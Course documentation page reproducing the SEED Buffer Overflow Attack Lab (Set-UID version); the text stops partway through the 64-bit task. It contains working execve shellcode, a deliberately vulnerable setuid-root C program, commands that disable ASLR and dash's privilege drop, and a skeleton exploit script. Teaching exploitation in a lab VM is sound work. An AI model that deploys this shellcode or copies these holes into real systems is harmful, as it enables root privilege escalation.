

<!DOCTYPE html>
<html class="writer-html4" lang="en" >
<head>
  <meta charset="utf-8" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <title>Buffer Overflow Attack Lab (Set-UID Version) &mdash; Network Security Lab  documentation</title>
  

  
  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />

  
  

  
  

  

  
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
        <script type="text/javascript" src="../../_static/jquery.js"></script>
        <script type="text/javascript" src="../../_static/underscore.js"></script>
        <script type="text/javascript" src="../../_static/doctools.js"></script>
        <script type="text/javascript" src="../../_static/language_data.js"></script>
        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    
    <script type="text/javascript" src="../../_static/js/theme.js"></script>

    
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Buffer Overflow Attack Lab (Server Version)" href="Buffer_Overflow_Server.html" />
    <link rel="prev" title="Shellcode Development Lab" href="Shellcode.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="../../index.html" class="icon icon-home"> Network Security Lab
          

          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        
        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
<li class="toctree-l2 current"><a class="reference internal" href="software_index.html">Software Security Labs</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="Shellcode.html">Shellcode Development Lab</a></li>
<li class="toctree-l3 current"><a class="current reference internal" href="#">Buffer Overflow Attack Lab (Set-UID Version)</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
<li class="toctree-l4"><a class="reference internal" href="#environment-setup">Environment Setup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-1-getting-familiar-with-shellcode">Task 1: Getting Familiar with Shellcode</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-2-understanding-the-vulnerable-program">Task 2: Understanding the Vulnerable Program</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-3-launching-attack-on-32-bit-program-level-1">Task 3: Launching Attack on 32-bit Program (Level 1)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-4-launching-attack-without-knowing-buffer-size-level-2">Task 4: Launching Attack without Knowing Buffer Size (Level 2)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-5-launching-attack-on-64-bit-program-level-3">Task 5: Launching Attack on 64-bit Program (Level 3)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-6-launching-attack-on-64-bit-program-level-4">Task 6: Launching Attack on 64-bit Program (Level 4)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tasks-7-defeating-dashs-countermeasure">Tasks 7: Defeating <code class="docutils literal notranslate"><span class="pre">dash</span></code>’s Countermeasure</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-8-defeating-address-randomization">Task 8: Defeating Address Randomization</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tasks-9-experimenting-with-other-countermeasures">Tasks 9: Experimenting with Other Countermeasures</a></li>
<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="Buffer_Overflow_Server.html">Buffer Overflow Attack Lab (Server Version)</a></li>
<li class="toctree-l3"><a class="reference internal" href="Return_to_Libc.html">Return-to-libc Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Environment_Variable_and_SetUID.html">Environment Variable and Program Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Race_Condition.html">Race Condition Vulnerability Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Dirty_COW.html">Dirty COW Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Format_String.html">Format String Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Shellshock.html">Shellshock Attack Lab</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
</ul>

            
          
        </div>
        
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Network Security Lab</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          

















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
        
          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
        
          <li><a href="software_index.html">Software Security Labs</a> &raquo;</li>
        
      <li>Buffer Overflow Attack Lab (Set-UID Version)</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="buffer-overflow-attack-lab-set-uid-version">
<h1>Buffer Overflow Attack Lab (Set-UID Version)<a class="headerlink" href="#buffer-overflow-attack-lab-set-uid-version" title="Permalink to this headline">¶</a></h1>
<div class="section" id="overview">
<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
<p>Buffer overflow is defined as the condition in which a program attempts
to write data beyond the boundary of a buffer. This vulnerability can be
used by a malicious user to alter the flow control of the program,
leading to the execution of malicious code. The objective of this lab is
for students to gain practical insights into this type of vulnerability,
and learn how to exploit the vulnerability in attacks.</p>
<p>In this lab, students will be given a program with a buffer-overflow
vulnerability; their task is to develop a scheme to exploit the
vulnerability and finally gain the root privilege. In addition to the
attacks, students will be guided to walk through several protection
schemes that have been implemented in the operating system to counter
against buffer-overflow attacks. Students need to evaluate whether the
schemes work or not and explain why. This lab covers the following
topics:</p>
<ul class="simple">
<li>Buffer overflow vulnerability and attack</li>
<li>Stack layout</li>
<li>Address randomization, non-executable stack, and StackGuard</li>
<li>Shellcode (32-bit and 64-bit)</li>
<li>The return-to-libc attack, which aims at defeating the non-executable
stack countermeasure, is covered in a separate lab.</li>
</ul>
<p><strong>Readings and videos.</strong> Detailed coverage of the buffer-overflow attack can be found in the
following:</p>
<ul class="simple">
<li>Chapter 4 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
<li>Section 4 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
</ul>
<p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.</p>
<p><strong>Note for instructors.</strong> Instructors can customize this lab by choosing values for <code class="docutils literal notranslate"><span class="pre">L1</span></code>, …,
<code class="docutils literal notranslate"><span class="pre">L4</span></code>. See Section&nbsp;4 for details.
Depending on the background of students and the time allocated for this
lab, instructors can also make the Level-2, Level-3, and Level-4 tasks
(or some of them) optional. The Level-1 task is sufficient to cover the
basics of the buffer-overflow attacks. Levels 2 to 4 increase the attack
difficulties. All the countermeasure tasks are based on the Level-1
task, so skipping the other levels does not affect those tasks.</p>
</div>
<div class="section" id="environment-setup">
<h2>Environment Setup<a class="headerlink" href="#environment-setup" title="Permalink to this headline">¶</a></h2>
<div class="section" id="turning-off-countermeasures">
<h3>Turning Off Countermeasures<a class="headerlink" href="#turning-off-countermeasures" title="Permalink to this headline">¶</a></h3>
<p>Modern operating systems have implemented several security mechanisms to
make the buffer-overflow attack difficult. To simplify our attacks, we
need to disable them first. Later on, we will enable them and see
whether our attack can still be successful or not.</p>
<p><strong>Address Space Randomization.</strong> and several other Linux-based systems uses address space randomization
to randomize the starting address of heap and stack. This makes guessing
the exact addresses difficult; guessing addresses is one of the critical
steps of buffer-overflow attacks. This feature can be disabled using the
following command:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo sysctl -w kernel.randomize_va_space=0
</pre></div>
</div>
<p><strong>Configuring ``/bin/sh``.</strong> In the recent versions of Ubuntu OS, the <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> symbolic link
points to the <code class="docutils literal notranslate"><span class="pre">/bin/dash</span></code> shell. The <code class="docutils literal notranslate"><span class="pre">dash</span></code> program, as well as
<code class="docutils literal notranslate"><span class="pre">bash</span></code>, has implemented a security countermeasure that prevents itself
from being executed in a process. Basically, if they detect that they
are executed in a process, they will immediately change the effective
user ID to the process’s real user ID, essentially dropping the
privilege.</p>
<p>Since our victim program is a program, and our attack relies on running
<code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code>, the countermeasure in <code class="docutils literal notranslate"><span class="pre">/bin/dash</span></code> makes our attack more
difficult. Therefore, we will link <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> to another shell that
does not have such a countermeasure (in later tasks, we will show that
with a little bit more effort, the countermeasure in <code class="docutils literal notranslate"><span class="pre">/bin/dash</span></code> can
be easily defeated). We have installed a shell program called <code class="docutils literal notranslate"><span class="pre">zsh</span></code> in
our Ubuntu 20.04 VM. The following command can be used to link
<code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> to <code class="docutils literal notranslate"><span class="pre">zsh</span></code>:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo ln -sf /bin/zsh /bin/sh
</pre></div>
</div>
<p><strong>StackGuard and Non-Executable Stack.</strong> These are two additional countermeasures implemented in the system. They
can be turned off during the compilation. We will discuss them later
when we compile the vulnerable program.</p>
</div>
</div>
<div class="section" id="task-1-getting-familiar-with-shellcode">
<h2>Task 1: Getting Familiar with Shellcode<a class="headerlink" href="#task-1-getting-familiar-with-shellcode" title="Permalink to this headline">¶</a></h2>
<p>The ultimate goal of buffer-overflow attacks is to inject malicious code
into the target program, so the code can be executed using the target
program’s privilege. Shellcode is widely used in most code-injection
attacks. Let us get familiar with it in this task.</p>
<div class="section" id="the-c-version-of-shellcode">
<h3>The C Version of Shellcode<a class="headerlink" href="#the-c-version-of-shellcode" title="Permalink to this headline">¶</a></h3>
<p>A shellcode is basically a piece of code that launches a shell. If we
use C code to implement it, it will look like the following:</p>
<div class="code c highlight-none notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;

int main() {
   char *name[2];

   name[0] = &quot;/bin/sh&quot;;
   name[1] = NULL;
   execve(name[0], name, NULL);
}
</pre></div>
</div>
<p>Unfortunately, we cannot just compile this code and use the binary code
as our shellcode (detailed explanation is provided in the SEED book).
The best way to write a shellcode is to use assembly code. In this lab,
we only provide the binary version of a shellcode, without explaining
how it works (it is non-trivial). If you are interested in how exactly
shellcode works and you want to write a shellcode from scratch, you can
learn that from a separate SEED lab called <em>Shellcode Lab</em>.</p>
</div>
<div class="section" id="bit-shellcode">
<h3>32-bit Shellcode<a class="headerlink" href="#bit-shellcode" title="Permalink to this headline">¶</a></h3>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>; Store the command on stack
xor  eax, eax
push eax
push &quot;//sh&quot;
push &quot;/bin&quot;
mov  ebx, esp     ; ebx --&gt; &quot;/bin//sh&quot;: execve()&#39;s 1st argument

; Construct the argument array argv[]
push eax          ; argv[1] = 0
push ebx          ; argv[0] --&gt; &quot;/bin//sh&quot;
mov  ecx, esp     ; ecx --&gt; argv[]: execve()&#39;s 2nd argument

; For environment variable
xor  edx, edx     ; edx = 0: execve()&#39;s 3rd argument

; Invoke execve()
xor  eax, eax     ;
mov  al,  0x0b    ; execve()&#39;s system call number
int  0x80
</pre></div>
</div>
<p>The shellcode above basically invokes the <code class="docutils literal notranslate"><span class="pre">execve()</span></code> system call to
execute <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code>. In a separate SEED lab, the Shellcode lab, we guide
students to write shellcode from scratch. Here we only give a very brief
explanation.</p>
<ul class="simple">
<li>The third instruction pushes <code class="docutils literal notranslate"><span class="pre">&quot;//sh&quot;</span></code>, rather than <code class="docutils literal notranslate"><span class="pre">&quot;/sh&quot;</span></code> into
the stack. This is because we need a 32-bit number here, and
<code class="docutils literal notranslate"><span class="pre">&quot;/sh&quot;</span></code> has only 24 bits. Fortunately, <code class="docutils literal notranslate"><span class="pre">&quot;//&quot;</span></code> is equivalent to
<code class="docutils literal notranslate"><span class="pre">&quot;/&quot;</span></code>, so we can get away with a double slash symbol.</li>
<li>We need to pass three arguments to execve() via the <code class="docutils literal notranslate"><span class="pre">ebx</span></code>, <code class="docutils literal notranslate"><span class="pre">ecx</span></code>
and <code class="docutils literal notranslate"><span class="pre">edx</span></code> registers, respectively. The majority of the shellcode
basically constructs the content for these three arguments.</li>
<li>The system call <code class="docutils literal notranslate"><span class="pre">execve()</span></code> is called when we set <code class="docutils literal notranslate"><span class="pre">al</span></code> to
<code class="docutils literal notranslate"><span class="pre">0x0b</span></code>, and execute <code class="docutils literal notranslate"><span class="pre">&quot;int</span> <span class="pre">0x80&quot;</span></code>.</li>
</ul>
</div>
<div class="section" id="id1">
<h3>64-Bit Shellcode<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
<p>We provide a sample 64-bit shellcode in the following. It is quite
similar to the 32-bit shellcode, except that the names of the registers
are different and the registers used by the <code class="docutils literal notranslate"><span class="pre">execve()</span></code> system call are
also different. Some explanation of the code is given in the comment
section, and we will not provide detailed explanation on the shellcode.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>xor  rdx, rdx        ; rdx = 0: execve()&#39;s 3rd argument
push rdx
mov  rax, &#39;/bin//sh&#39; ; the command we want to run
push rax             ;
mov  rdi, rsp        ; rdi --&gt; &quot;/bin//sh&quot;: execve()&#39;s 1st argument
push rdx             ; argv[1] = 0
push rdi             ; argv[0] --&gt; &quot;/bin//sh&quot;
mov  rsi, rsp        ; rsi --&gt; argv[]: execve()&#39;s 2nd argument
xor  rax, rax
mov  al,  0x3b       ; execve()&#39;s system call number
syscall
</pre></div>
</div>
</div>
<div class="section" id="task-invoking-the-shellcode">
<h3>Task: Invoking the Shellcode<a class="headerlink" href="#task-invoking-the-shellcode" title="Permalink to this headline">¶</a></h3>
<p>We have generated the binary code from the assembly code above, and put
the code in a C program called <code class="docutils literal notranslate"><span class="pre">call_shellcode.c</span></code> inside the
<code class="docutils literal notranslate"><span class="pre">shellcode</span></code> folder. If you would like to learn how to generate the
binary code yourself, you should work on the Shellcode lab. In this
task, we will test the shellcode. Listing 1: call_shellcode.c.</p>
<div class="code c highlight-none notranslate"><div class="highlight"><pre><span></span>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

const char shellcode[] =
#if __x86_64__
  &quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;
  &quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;
  &quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;
#else
  &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
  &quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;
  &quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode); // Copy the shellcode to the stack
   int (*func)() = (int(*)())code;
   func();                 // Invoke the shellcode from the stack
   return 1;
}
</pre></div>
</div>
<p>The code above includes two copies of shellcode, one is 32-bit and the
other is 64-bit. When we compile the program using the <code class="docutils literal notranslate"><span class="pre">-m32</span></code> flag,
the 32-bit version will be used; without this flag, the 64-bit version
will be used. Using the provided <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>, you can compile the code
by typing <code class="docutils literal notranslate"><span class="pre">make</span></code>. Two binaries will be created, <code class="docutils literal notranslate"><span class="pre">a32.out</span></code> (32-bit)
and <code class="docutils literal notranslate"><span class="pre">a64.out</span></code> (64-bit). Run them and describe your observations. It
should be noted that the compilation uses the <code class="docutils literal notranslate"><span class="pre">execstack</span></code> option,
which allows code to be executed from the stack; without this option,
the program will fail.</p>
</div>
</div>
<div class="section" id="task-2-understanding-the-vulnerable-program">
<h2>Task 2: Understanding the Vulnerable Program<a class="headerlink" href="#task-2-understanding-the-vulnerable-program" title="Permalink to this headline">¶</a></h2>
<p>The vulnerable program used in this lab is called <code class="docutils literal notranslate"><span class="pre">stack.c</span></code>, which is
in the <code class="docutils literal notranslate"><span class="pre">code</span></code> folder. This program has a buffer-overflow
vulnerability, and your job is to exploit this vulnerability and gain
the root privilege. The code listed below has some non-essential
information removed, so it is slightly different from what you get from
the lab setup file. Listing 2: The vulnerable program (stack.c).</p>
<div class="code c highlight-none notranslate"><div class="highlight"><pre><span></span>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won&#39;t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf(&quot;Returned Properly\n&quot;);
    return 1;
}
</pre></div>
</div>
<p>The above program has a buffer overflow vulnerability. It first reads an
input from a file called <code class="docutils literal notranslate"><span class="pre">badfile</span></code>, and then passes this input to
another buffer in the function bof(). The original input can have a
maximum length of <code class="docutils literal notranslate"><span class="pre">517</span></code> bytes, but the buffer in bof() is only
<code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> bytes long, which is less than <code class="docutils literal notranslate"><span class="pre">517</span></code>. Because strcpy()
does not check boundaries, buffer overflow will occur. Since this
program is a root-owned program, if a normal user can exploit this
buffer overflow vulnerability, the user might be able to get a root
shell. It should be noted that the program gets its input from a file
called <code class="docutils literal notranslate"><span class="pre">badfile</span></code>. This file is under users’ control. Now, our
objective is to create the contents for <code class="docutils literal notranslate"><span class="pre">badfile</span></code>, such that when the
vulnerable program copies the contents into its buffer, a root shell can
be spawned.</p>
<p><strong>Compilation.</strong> To compile the above vulnerable program, do not forget to turn off the
StackGuard and the non-executable stack protections using the
<code class="docutils literal notranslate"><span class="pre">-fno-stack-protector</span></code> and <code class="docutils literal notranslate"><span class="pre">&quot;-z</span> <span class="pre">execstack&quot;</span></code> options. After the
compilation, we need to make the program a root-owned program. We can
achieve this by first change the ownership of the program to <code class="docutils literal notranslate"><span class="pre">root</span></code>
(Line ), and then change the permission to <code class="docutils literal notranslate"><span class="pre">4755</span></code> to enable the bit
(Line ). It should be noted that changing ownership must be done before
turning on the bit, because ownership change will cause the bit to be
turned off.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack          ➀
$ sudo chmod 4755 stack          ➁
</pre></div>
</div>
<p>The compilation and setup commands are already included in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>,
so we just need to type <code class="docutils literal notranslate"><span class="pre">make</span></code> to execute those commands. The
variables <code class="docutils literal notranslate"><span class="pre">L1</span></code>, …, <code class="docutils literal notranslate"><span class="pre">L4</span></code> are set in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>; they will be used
during the compilation. If the instructor has chosen a different set of
values for these variables, you need to change them in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>.</p>
<p><strong>For instructors (customization).</strong> To make the lab slightly different from the one offered in the past,
instructors can change the value for <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> by requiring students
to compile the server code using different <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> values. In
<code class="docutils literal notranslate"><span class="pre">Makefile</span></code>, the <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> value is set by four variables <code class="docutils literal notranslate"><span class="pre">L1</span></code>,
…, <code class="docutils literal notranslate"><span class="pre">L4</span></code>. Instructors should pick the values for these variables
based on the following suggestions:</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">L1</span></code>: pick a number between 100 and 400</li>
<li><code class="docutils literal notranslate"><span class="pre">L2</span></code>: pick a number between 100 and 200</li>
<li><code class="docutils literal notranslate"><span class="pre">L3</span></code>: pick a number between 100 and 400</li>
<li><code class="docutils literal notranslate"><span class="pre">L4</span></code>: we need to keep this number smaller, to make this level more
challenging than the previous level. Since there are not many
choices, we will fix this number at 10.</li>
</ul>
</div>
<div class="section" id="task-3-launching-attack-on-32-bit-program-level-1">
<h2>Task 3: Launching Attack on 32-bit Program (Level 1)<a class="headerlink" href="#task-3-launching-attack-on-32-bit-program-level-1" title="Permalink to this headline">¶</a></h2>
<div class="section" id="investigation">
<h3>Investigation<a class="headerlink" href="#investigation" title="Permalink to this headline">¶</a></h3>
<p>To exploit the buffer-overflow vulnerability in the target program, the
most important thing to know is the distance between the buffer’s
starting position and the place where the return-address is stored. We
will use a debugging method to find it out. Since we have the source
code of the target program, we can compile it with the debugging flag
turned on. That will make it more convenient to debug.</p>
<p>We will add the <code class="docutils literal notranslate"><span class="pre">-g</span></code> flag to <code class="docutils literal notranslate"><span class="pre">gcc</span></code> command, so debugging information
is added to the binary. If you run <code class="docutils literal notranslate"><span class="pre">make</span></code>, the debugging version is
already created. We will use <code class="docutils literal notranslate"><span class="pre">gdb</span></code> to debug <code class="docutils literal notranslate"><span class="pre">stack-L1-dbg</span></code>. We need
to create a file called <code class="docutils literal notranslate"><span class="pre">badfile</span></code> before running the program.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ touch badfile       &lt;-- Create an empty badfile
$ gdb stack-L1-dbg
gdb-peda$ b bof       &lt;-- Set a break point at function bof()
Breakpoint 1 at 0x124d: file stack.c, line 18.
gdb-peda$ run         &lt;-- Start executing the program
...
Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
18  {
gdb-peda$ next        &lt;-- See the note below
...
22      strcpy(buffer, str);
gdb-peda$ p $ebp      &lt;-- Get the ebp value
$1 = (void *) 0xffffdfd8
gdb-peda$ p &amp;buffer   &lt;-- Get the buffer&#39;s address
$2 = (char (*)[100]) 0xffffdfac
gdb-peda$ quit        &lt;-- exit
</pre></div>
</div>
<p><strong>Note 1.</strong> When <code class="docutils literal notranslate"><span class="pre">gdb</span></code> stops inside the <code class="docutils literal notranslate"><span class="pre">bof()</span></code> function, it stops before the
<code class="docutils literal notranslate"><span class="pre">ebp</span></code> register is set to point to the current stack frame, so if we
print out the value of <code class="docutils literal notranslate"><span class="pre">ebp</span></code> here, we will get the caller’s <code class="docutils literal notranslate"><span class="pre">ebp</span></code>
value. We need to use <code class="docutils literal notranslate"><span class="pre">next</span></code> to execute a few instructions and stop
after the <code class="docutils literal notranslate"><span class="pre">ebp</span></code> register is modified to point to the stack frame of
the <code class="docutils literal notranslate"><span class="pre">bof()</span></code> function. The SEED book is based on Ubuntu 16.04, and
<code class="docutils literal notranslate"><span class="pre">gdb</span></code>’s behavior is slightly different, so the book does not have
the <code class="docutils literal notranslate"><span class="pre">next</span></code> step.</p>
<p><strong>Note 2.</strong> It should be noted that the frame pointer value obtained from <code class="docutils literal notranslate"><span class="pre">gdb</span></code> is
different from that during the actual execution (without using <code class="docutils literal notranslate"><span class="pre">gdb</span></code>).
This is because <code class="docutils literal notranslate"><span class="pre">gdb</span></code> has pushed some environment data into the stack
before running the debugged program. When the program runs directly
without using <code class="docutils literal notranslate"><span class="pre">gdb</span></code>, the stack does not have those data, so the actual
frame pointer value will be larger. You should keep this in mind when
constructing your payload.</p>
</div>
<div class="section" id="launching-attacks">
<h3>Launching Attacks<a class="headerlink" href="#launching-attacks" title="Permalink to this headline">¶</a></h3>
<p>To exploit the buffer-overflow vulnerability in the target program, we
need to prepare a payload, and save it inside <code class="docutils literal notranslate"><span class="pre">badfile</span></code>. We will use a
Python program to do that. We provide a skeleton program called
<code class="docutils literal notranslate"><span class="pre">exploit.py</span></code>, which is included in the lab setup file. The code is
incomplete, and students need to replace some of the essential values in
the code. Listing 3: <code class="docutils literal notranslate"><span class="pre">exploit.py</span></code>.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/usr/bin/python3
import sys

shellcode= (
  &quot;&quot;                    # ✩ Need to change
).encode(&#39;latin-1&#39;)

# Fill the content with NOP&#39;s
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # ✩ Need to change
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00           # ✩ Need to change
offset = 0              # ✩ Need to change

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=&#39;little&#39;)
##################################################################

# Write the content to a file
with open(&#39;badfile&#39;, &#39;wb&#39;) as f:
  f.write(content)
</pre></div>
</div>
<p>After you finish the above program, run it. This will generate the
contents for <code class="docutils literal notranslate"><span class="pre">badfile</span></code>. Then run the vulnerable program stack. If your
exploit is implemented correctly, you should be able to get a root
shell:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$./exploit.py     // create the badfile
$./stack-L1       // launch the attack by running the vulnerable program
# &lt;---- Bingo! You&#39;ve got a root shell!
</pre></div>
</div>
<p>In your lab report, in addition to providing screenshots to demonstrate
your investigation and attack, you also need to explain how the values
used in your <code class="docutils literal notranslate"><span class="pre">exploit.py</span></code> are decided. These values are the most
important part of the attack, so a detailed explanation can help the
instructor grade your report. Only demonstrating a successful attack
without explaining why the attack works will not receive many points.</p>
</div>
</div>
<div class="section" id="task-4-launching-attack-without-knowing-buffer-size-level-2">
<h2>Task 4: Launching Attack without Knowing Buffer Size (Level 2)<a class="headerlink" href="#task-4-launching-attack-without-knowing-buffer-size-level-2" title="Permalink to this headline">¶</a></h2>
<p>In the Level-1 attack, using <code class="docutils literal notranslate"><span class="pre">gdb</span></code>, we get to know the size of the
buffer. In the real world, this piece of information may be hard to get.
For example, if the target is a server program running on a remote
machine, we will not be able to get a copy of the binary or source code.
In this task, we are going to add a constraint: you can still use
<code class="docutils literal notranslate"><span class="pre">gdb</span></code>, but you are not allowed to derive the buffer size from your
investigation. Actually, the buffer size is provided in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>,
but you are not allowed to use that information in your attack.</p>
<p>Your task is to get the vulnerable program to run your shellcode under
this constraint. We assume that you do know the range of the buffer
size, which is from 100 to 200 bytes. Another fact that may be useful to
you is that, due to the memory alignment, the value stored in the frame
pointer is always multiple of four (for 32-bit programs).</p>
<p>Please be noted, you are only allowed to construct one payload that
works for any buffer size within this range. You will not get all the
credits if you use the brute-force method, i.e., trying one buffer size
each time. The more you try, the easier it will be detected and defeated
by the victim. That’s why minimizing the number of trials is important
for attacks. In your lab report, you need to describe your method, and
provide evidences.</p>
</div>
<div class="section" id="task-5-launching-attack-on-64-bit-program-level-3">
<h2>Task 5: Launching Attack on 64-bit Program (Level 3)<a class="headerlink" href="#task-5-launching-attack-on-64-bit-program-level-3" title="Permalink to this headline">¶</a></h2>
<p>In this task, we will compile the vulnerable program into a 64-bit
binary called <code class="docutils literal notranslate"><span class="pre">stack-L3</span></code>. We will launch attacks on this program. The
compilation and setup commands are already included in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>.
Similar to the previous task, detailed explanation of your attack needs
to be provided in the lab report.</p>
<p>Using <code class="docutils literal notranslate"><span class="pre">gdb</span></code> to conduct an investigation on 64-bit programs is the same
as that on 32-bit programs. The only difference is the name of the
register for the frame pointer. In the x86 architecture, the frame
pointer is <code class="docutils literal notranslate"><span class="pre">ebp</span></code>, while in the x64 architecture, it is <code class="docutils literal notranslate"><span class="pre">rbp</span></code>.</p>
<p><strong>Challenges.</strong> Compared to buffer-overflow attacks on 32-bit machines, attacks on
64-bit machines is more difficult. The most difficult part is the
address. Although the x64 architecture supports 64-bit address space,
